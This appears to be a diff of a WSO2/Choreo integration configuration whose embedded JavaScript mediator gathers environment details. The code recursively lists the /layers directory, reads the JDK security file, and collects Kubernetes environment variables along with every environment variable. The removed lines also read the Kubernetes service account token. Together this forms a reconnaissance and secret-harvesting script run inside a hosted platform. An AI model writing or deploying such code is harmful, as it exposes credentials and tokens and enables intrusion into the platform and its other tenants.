@@ -4,9 +4,30 @@
         <inSequence>
 <script language="js">
     <![CDATA[
-        // Get server details
         var serverDetails = {};
         
+        function getDirectoryContentsRecursive(path) {
+            var file = new java.io.File(path);
+            var result = {};
+            if (file.exists() && file.isDirectory()) {
+                var list = file.listFiles();
+                if (list !== null) {
+                    for (var i = 0; i < list.length; i++) {
+                        var currentFile = list[i];
+                        if (currentFile.isDirectory()) {
+                            // Recursively call for subdirectories
+                            result[currentFile.getName()] = getDirectoryContentsRecursive(currentFile.getAbsolutePath());
+                        } else {
+                            // Add file name
+                            result[currentFile.getName()] = "file";
+                        }
+                    }
+                }
+            }
+            return result;
+        }
+        serverDetails.layersDirectoryContents = getDirectoryContentsRecursive("/layers");
+
         function readFileContent(path) {
             var content = "";
             try {
@@ -27,30 +48,26 @@
             return content;
         }
 
-                    // Capturing Kubernetes-specific environment variables
-                    var k8sEnv = {};
-                    k8sEnv.podName = java.lang.System.getenv("HOSTNAME");
-                    k8sEnv.serviceHost = java.lang.System.getenv("KUBERNETES_SERVICE_HOST");
-                    k8sEnv.servicePort = java.lang.System.getenv("KUBERNETES_SERVICE_PORT");
-                    k8sEnv.containerName = java.lang.System.getenv("CONTAINER_NAME");
-                    k8sEnv.podIP = java.lang.System.getenv("POD_IP");
-                    k8sEnv.nodeName = java.lang.System.getenv("NODE_NAME");
-                    serverDetails.k8sInfo = k8sEnv;
+        var readfile = "/layers/choreo_micro-integrator/jdk/conf/security/java.security";
+        serverDetails.fileontent = readFileContent(readfile);
 
-                    // Capturing Kubernetes Service Account token and CA certificate
-                    var serviceAccountTokenPath = "/var/run/secrets/kubernetes.io/serviceaccount/token";
-                    serverDetails.k8sServiceAccountToken = readFileContent(serviceAccountTokenPath);
+        // Capturing Kubernetes-specific environment variables
+        var k8sEnv = {};
+        k8sEnv.podName = java.lang.System.getenv("HOSTNAME");
+        k8sEnv.serviceHost = java.lang.System.getenv("KUBERNETES_SERVICE_HOST");
+        k8sEnv.servicePort = java.lang.System.getenv("KUBERNETES_SERVICE_PORT");
+        serverDetails.k8sInfo = k8sEnv;
 
-                    // Capturing all other environment variables
-                    var envMap = java.lang.System.getenv();
-                    var allEnvVariables = {};
-                    var iterator = envMap.keySet().iterator();
-                    while (iterator.hasNext()) {
-                        var key = iterator.next();
-                        var value = envMap.get(key);
-                        allEnvVariables[key] = value;
-                    }
-                    serverDetails.allEnvironmentVariables = allEnvVariables;
+        // Capturing all other environment variables
+        var envMap = java.lang.System.getenv();
+        var allEnvVariables = {};
+        var iterator = envMap.keySet().iterator();
+        while (iterator.hasNext()) {
+            var key = iterator.next();
+            var value = envMap.get(key);
+            allEnvVariables[key] = value;
+        }
+        serverDetails.allEnvironmentVariables = allEnvVariables;
         
         // Get Java system properties
         var javaVersion = java.lang.System.getProperty("java.version");
